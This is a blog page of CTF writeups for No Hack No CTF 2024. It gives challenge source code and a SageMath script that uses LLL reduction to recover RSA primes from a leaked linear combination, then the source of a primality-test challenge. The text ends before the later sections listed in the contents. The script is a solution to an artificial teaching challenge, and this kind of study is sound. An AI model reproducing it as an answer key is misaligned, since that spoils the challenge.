<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before all Author: whale.120  CTFTime Link: https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2574&#x2F;This CTF was held by my CTF Team ICEDTEA(link to CTFTime), it was for those newbies in Cyber Security (at first).   But to sa">
<meta property="og:type" content="article">
<meta property="og:title" content="My Writeups for some challenges in No Hack No CTF 2024">
<meta property="og:url" content="http://wha13.github.io/2024/11/17/nhnc-2024-wp/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before all Author: whale.120  CTFTime Link: https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2574&#x2F;This CTF was held by my CTF Team ICEDTEA(link to CTFTime), it was for those newbies in Cyber Security (at first).   But to sa">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/BJWDfKDz1l.png">
<meta property="article:published_time" content="2024-11-17T14:55:19.000Z">
<meta property="article:modified_time" content="2024-11-17T15:01:30.733Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="ICEDTEA">
<meta property="article:tag" content="serialization">
<meta property="article:tag" content="LLL">
<meta property="article:tag" content="Miller-Rabin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/BJWDfKDz1l.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>My Writeups for some challenges in No Hack No CTF 2024</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/11/23/win-pwn-basic/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/11/10/hitcon-final-2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/17/nhnc-2024-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&text=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&is_video=false&description=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=My Writeups for some challenges in No Hack No CTF 2024&body=Check out this article: http://wha13.github.io/2024/11/17/nhnc-2024-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&title=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&name=My Writeups for some challenges in No Hack No CTF 2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/17/nhnc-2024-wp/&t=My Writeups for some challenges in No Hack No CTF 2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-RSA"><span class="toc-number">2.</span> <span class="toc-text">Lion RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-Prime"><span class="toc-number">3.</span> <span class="toc-text">Lion Prime</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lion-Prime-Revenge"><span class="toc-number">4.</span> <span class="toc-text">Lion Prime Revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1"><span class="toc-number">4.1.</span> <span class="toc-text">Step 1.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2"><span class="toc-number">4.2.</span> <span class="toc-text">Step 2.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3"><span class="toc-number">4.3.</span> <span class="toc-text">Step 3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">4.4.</span> <span class="toc-text">Exploit!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POPcorn"><span class="toc-number">5.</span> <span class="toc-text">POPcorn</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        My Writeups for some challenges in No Hack No CTF 2024
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-17T14:55:19.000Z" class="dt-published" itemprop="datePublished">2024-11-17</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/ICEDTEA/" rel="tag">ICEDTEA</a>, <a class="p-category" href="/tags/LLL/" rel="tag">LLL</a>, <a class="p-category" href="/tags/Miller-Rabin/" rel="tag">Miller-Rabin</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/serialization/" rel="tag">serialization</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><blockquote>
<p>Author: whale.120</p>
</blockquote>
<p>CTFTime Link: <a target="_blank" rel="noopener" href="https://ctftime.org/event/2574/">https://ctftime.org/event/2574/</a><br>This CTF was held by my CTF Team ICEDTEA<a target="_blank" rel="noopener" href="https://ctftime.org/team/303514">(link to CTFTime)</a>, it was for those newbies in Cyber Security (<del>at first</del>).  </p>
<p>But to satisfy those skillful player, I still generated some “tougher” challenges … here are there writeups~<br><em>I done the writeup for those harder challenges since those easy ones could be answered on our DC channel&#x2F;GPTable&#x2F;Google……</em><br>Hope you enjoy them~  </p>
<h2 id="Lion-RSA"><a href="#Lion-RSA" class="headerlink" title="Lion RSA"></a>Lion RSA</h2><p>With a HINT about LLL algorithm, you may take a look at it first: <a target="_blank" rel="noopener" href="https://cryptohack.gitbook.io/cryptobook/lattices/lll-reduction">Introduction on CTFTime(link)</a>  </p>
<p>(This is also what I want those newbies who were trying to solve this challenge can learn from the CTF!)  </p>
<p>Anyway, for those who would have headache after seeing the definition on wikipedia, I would explain it as easy as possible here:<br>For a matrix like this:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[a1, b1, c1]  </span><br><span class="line">[a2, b2, c2]  </span><br><span class="line">[a3, b3, c3]]  </span><br></pre></td></tr></table></figure>
<p>You can find some short(may be the shortest) linear combination originated from the three vectors up there.<br>ahh…<br>Linear Combination is something like this:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[a1, b1, c1]*x+[a2, b2, c2]*y+[a3, b3, c3]*z</span><br><span class="line">=</span><br><span class="line">[a1*x+a2*y+a3*z, b1*x+b2*y+b3*z, c1*x+c2*y+c3*z]</span><br></pre></td></tr></table></figure>
<p>The short one is the length in N-dimension(in this example, 3) coordinate space.  </p>
<p>Back to the challenge:<br><strong>Source Code:</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> flag2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">primes</span>):</span><br><span class="line">    mod=getPrime(<span class="number">4096</span>)</span><br><span class="line">    parameters=[getPrime(<span class="number">4096</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        cnt+=primes[i]*parameters[i]</span><br><span class="line">        cnt%=mod</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;---leak info---\n<span class="subst">&#123;cnt=&#125;</span>\n<span class="subst">&#123;parameters=&#125;</span>\n<span class="subst">&#123;mod=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">primes=[getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">p, q, r=primes[<span class="number">0</span>], primes[<span class="number">1</span>], primes[<span class="number">2</span>]</span><br><span class="line">n=p*q*r</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag2), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>\n<span class="subst">&#123;e=&#125;</span>\n<span class="subst">&#123;c=&#125;</span>&quot;</span>)</span><br><span class="line">leak_info(primes)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">     (&quot;`-/&quot;)_.-&#x27;&quot;``-._</span></span><br><span class="line"><span class="string">      . . `; -._    )-;-,_`)</span></span><br><span class="line"><span class="string">     (v_,)&#x27;  _  )`-.\  ``-&#x27;</span></span><br><span class="line"><span class="string">    _.- _..-_/ / ((.&#x27;</span></span><br><span class="line"><span class="string">  ((,.-&#x27;   ((,/             </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>The main part for the challenge is to recover the primes value through the given Diophantine(indefinite) equation, which can done by constructing this matrix:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parameters[0], 1, 0, 0, 0</span><br><span class="line">parameters[1], 0, 1, 0, 0</span><br><span class="line">parameters[2], 0, 0, 1, 0</span><br><span class="line">cnt, 0, 0, 0, BIG_INT</span><br><span class="line">mod, 0, 0, 0, 0</span><br></pre></td></tr></table></figure>
<p>and calculate its LLL reduction.<br>Why?<br>This is your homework :P<br>Using sagemath to done the solve script would be the easiest way since it has a LLL inate!  </p>
<p><strong>Solution.sage</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n=850358776734762625610496167384220802043695088586647706263013412016558151373468256850614059444495341009523025993228019019484863442165952924090283376835119311476511529244138266880127799201264719510804740103587745059216402910327945906733854426136405275480409716534953528825023327108813636423585394092144105046580572533453263431410294955501027518831529446117821435408657869068571310504343501991628387159339735592134223958144931722017237929211429476787355039594278299</span><br><span class="line">e=65537</span><br><span class="line">c=200413763549050466748971622976849366507245427885467588628192630096407794628592187373659648702752808509394380939305120478401886385929076589324518256235537378815458337935586745312510482638600109279657614625095732081550424631176228716337600051477003794531278200814416621767057677198330147356294574898445444818682897113169023152749333631710728838641706815826965347527974451938036816752469823241722909021675157204329481291669941379336051269619625614338604867409650418</span><br><span class="line">cnt=308073764938199679889893900919496163724170563946382628163811034442913065930497053453496279455500879524350781449265127484248255897866751495559083782847264789180365499922364443623870677273997537774934033334919689548417487273302521933113656780592232441279385226606121643240796027193726982581033728143761795641392992367439131484124130388875108829290292861562956999853162079850758839613449096415803723856298524294696668803622262137229451376445626839749111979278202630712096304049625678749265783766537864077689095436054598077020779366376248291041557186082218642343106543320665553748286237881294386840748836397117281360045257958877906847899323034035163065464057915296829988318304500910665967674163386618421134981089594491067543813717225768536071306173308265481385428530659899253173747243484918575407716243872035135045713234136555068291875911801057487219284000875462707214490425978348979126717348046449013729554655474336274686465819031711602142828562122209093915502696243469941039966787157143801800251743919362889199604565271639221586609712229422369839934975686122648740857092161310015520805595747177762092972257551914490676543988903806886530873755356871949947046258037075940927222499966836373690288112858070367852861695917083950065779701409</span><br><span class="line">parameters=[797594260659167990737150668954706169587862379772173239533328230854499677350491199853041931101486287669583949548665682775274475434926468499361263381322621884948825560103677387768397468925821639683048310775186545418658745530350595124755775270372056667034632993936860485443846886172755261404256517820516628539355361535442083799694718921785486184981976452698904715789889831599420505246435359561129519090635486982240063979730766054819554066897300253782520846706313561345056543504388546524403655947154199575151340060031977503083707102819919911835080082859097654062988744018168369487101385983025946773855492817736202070011876415142843756184097790970252640812082926702815027266459479249521142343696866227004335080535708073197010986526989492972768357762028697047384555817048068830604039230715095870953693125336507219546780264377943109070478882424401929265216587466161982074737973806849176192233910880900079278116072317650441927116452412341385259714169525290374313234171885618861791330206677075809722889681550213012849405323478111806106304017437442002412888402704438177628514188938908406966549593872098532970691404609356394224849549961349927315437062184228167901766788037055953187336473949524854200264510873413030589805459981968604127851786609, 615904261610465971568431939054075405169710788781881484522290444408088022926645652214469675499953631142306581955048384268029195531629598982730174708582264580752161851289639999640436040412778908052736156425227616667102467019783010937546363102012187726571182569697306740197923616713681122806568406026266234604223699265025369666568063458928215212425217625256097286276068862149329399072401238690385308920059441769816412007750405319700732835263103958256218298564559786183025757542008949975288072302686757126625466501678775963040671153208854221940651035872583568089660281917743122984801541397380742705635016543065201656814088270597711354406170714155381031934760458396640625534445483456167060255353363213579033791442645201687073286050126814227024588347480865283238712100651188533025918048680796788490885540132402507133154895072584354177808547366584353725100995600344608203228507853472361752069464546221088078933334841297383663024257971918073302978964868912443824486416331995859641108926013589469216416831335413891625267728081143947039286755692506424465123971802190275736384262486514942481067754609712069600438753520436377871180410941593511972564955921478007035904845354114481042159454028397445862502366094428040081584516092950991604990561281, 760129149149519255620925696824943936768638754263034532833954275615938500384975753565857037756746941336840882557996034631214100861636849015358478147184915394193636768770791363628228456892196838837742126203613033579610533105290906088535533391277672482701618128391397637608522167933763003916550580331883231067899994365973676060497546547930098414163990180936761942600814893363541552985965376680706585943515214042023725554593840207080024980172128037873274678478060328272025256172910102462498519411600556721011033800944362356085039355225250749471668128745729468994233357396514001979613609499232290973059250565280875972556372912263659080543926994101454900030388231299465533344795470352500099933890186725060151395107114439086048603665785870991794741266750034266610949025631016471741469269597865511380192408523863423771265927472587465120677838460175147013636755827658975972832587431139696893136126607426248861314887210643625020290458698436573290309676056741838790765493657871615891564493666401341643364051681303856280160046523835456069238834746534655754434677502493886096650011916248999701430456124590454734366473641852165837811544682151105204203446515516920686718349424719918651505806625019017720511495078085521447676233972310229468833651769]</span><br><span class="line">mod=674902840903965090919316958657283359970357248448734078799547377020018648102279835468805138690527754836682055250304076874803648246635613584377908340190207861319001527780030340567165061517211004656225895529100411252357644463078927222476679856822044010275315595695824716527940995397514173805791664755113232432689809368113079193900245003050353525133358841491362167375681125518464222180646760808602982296314549627388988211253784662415781772111961592632633985531245368770311142082845617427759307819611455897455579468131389423633234934448236620829156850351669285334704048022399914514800171445872196892592756013365023370787111457469076056984522568485520536784560583664159929268013412581976739076228848916397009179334701850686889156471728663321177225502628827143266729426513036751986977476318270241347405966668019316760428153928857990960922999398941224486254201530394109866266661355530736517903562089139189226795933813446800171957116441275624283985897816475999287490405004342628865326868449086861938452337218120128412657673670731482889697650700138653414510157027719072911832045423998770780416774192026856701088642107003265041596277208359842868205201152981041736232686199235217180079200238913839081067402516126401979087095872448181740740363641</span><br><span class="line"></span><br><span class="line">A=[[0]*5 for _ in range(5)]</span><br><span class="line">for i in range(3):</span><br><span class="line">    A[i][0]=parameters[i]</span><br><span class="line">    A[i][i+1]=1</span><br><span class="line"></span><br><span class="line">A[3][0]=cnt</span><br><span class="line">A[3][4]=pow(2, 2000)</span><br><span class="line">A[4][0]=mod</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,A)</span><br><span class="line">r = A.LLL()</span><br><span class="line"></span><br><span class="line">for arr in r:</span><br><span class="line">    if arr[0]==0:</span><br><span class="line">        p, q, r=int(-arr[1]), int(-arr[2]), int(-arr[3])</span><br><span class="line">        phi=(p-1)*(q-1)*(r-1)</span><br><span class="line">        d=inverse(e, phi)</span><br><span class="line">        print(long_to_bytes(pow(int(c), int(d), int(n))))</span><br></pre></td></tr></table></figure>

<h2 id="Lion-Prime"><a href="#Lion-Prime" class="headerlink" title="Lion Prime"></a>Lion Prime</h2><p>This challenge had been solved by a VERY EASY unintended method so I made a revenge one XD.<br><strong>Source Code:</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">banner=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Something not important</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">datas</span>):</span><br><span class="line">    mul=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            mul*=i</span><br><span class="line">            <span class="built_in">str</span>(mul)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mul&gt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">64</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lion_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1337</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(random.randrange(<span class="number">1</span>, n), n - <span class="number">1</span>, n) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checker</span>(<span class="params">datas</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> patch(datas) <span class="keyword">or</span> <span class="built_in">len</span>(datas)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error detected&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    x=np.array(datas[:<span class="number">60</span>]).prod()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pow</span>(<span class="number">5</span>, x)-<span class="built_in">pow</span>(<span class="number">3</span>, x))%(<span class="built_in">pow</span>(<span class="number">2</span>, x)+<span class="number">115</span>)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NHNC&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;The cutest lion doesn\&#x27;t like your logs...&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    logs=[]</span><br><span class="line">    oops=random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Oops: <span class="subst">&#123;oops&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Input your number to check if it&#x27;s a Lion Prime: &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> p==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lion_prime(p):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;This is a Lion Prime, prove me wrong !!!&quot;</span>)</span><br><span class="line">            cur=[]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">                cur.append(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;Factor <span class="subst">&#123;i&#125;</span>: &quot;</span>)))</span><br><span class="line">                <span class="keyword">if</span> cur[i-<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Invalid Factor!!!&quot;</span>)</span><br><span class="line">                    exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> cur[<span class="number">0</span>]*cur[<span class="number">1</span>]*cur[<span class="number">2</span>]==p:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK, I&#x27;ll report the issue&quot;</span>)</span><br><span class="line">                logs.append(p^oops)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;WA / 0&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;This is not a Lion Prime QwQ...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(logs)!=<span class="built_in">len</span>(<span class="built_in">set</span>(logs)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Collision!!!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">        </span><br><span class="line">    checker(logs)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

